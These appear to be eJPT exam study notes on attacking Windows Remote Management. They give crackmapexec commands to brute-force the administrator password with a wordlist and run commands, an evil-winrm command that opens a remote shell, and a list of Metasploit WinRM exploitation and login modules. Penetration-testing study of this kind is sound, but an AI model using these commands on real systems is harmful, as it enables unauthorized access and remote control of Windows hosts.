## WinRM - p5985 and 5986 (HTTPS)

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)

Windows remote management protocol enables the connection between Windows systems using the HTTP protocol.

### crackmapexec
```
crackmapexec winrm 10.10.10.1 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_password.txt
```
It is used to forcefully access the service and execute commands using user credentials.
```
crackmapexec winrm 10.10.10.1 -u administrator -p tinkerbell -x “whoami”
```
### evil-winrm.rb
```
evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.10.10.1
```
It is used to obtain a remote shell on the target system.

### Metasploit

Meterpreter session.
```
search winrm_script_exec
set FORCE_VBS true
```
Other useful modules.
```
search winrm_auth_methods
search winrm_login
search winrm_cmd
```
